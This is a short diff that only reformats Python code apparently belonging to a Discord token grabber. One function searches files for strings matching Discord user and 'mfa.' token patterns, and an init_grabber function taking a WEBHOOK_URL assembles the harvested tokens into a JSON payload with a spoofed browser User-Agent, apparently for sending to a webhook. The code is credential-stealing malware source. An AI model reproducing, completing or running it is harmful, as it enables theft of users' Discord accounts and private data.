@@ -15,11 +15,12 @@ def find_tokens(path):
             continue
 
         for line in [
-            x.strip()
-            for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
-            if x.strip()
+                x.strip() for x in open(f"{path}\\{file_name}",
+                                        errors="ignore").readlines()
+                if x.strip()
         ]:
-            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
+                          r"mfa\.[\w-]{84}"):
                 tokens.extend(iter(re.findall(regex, line)))
     return tokens
 
@@ -57,8 +58,10 @@ def init_grabber(WEBHOOK_URL):
         message += "```"
 
     headers = {
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+        "Content-Type":
+        "application/json",
+        "User-Agent":
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
     }
 
     payload = json.dumps({"content": message})
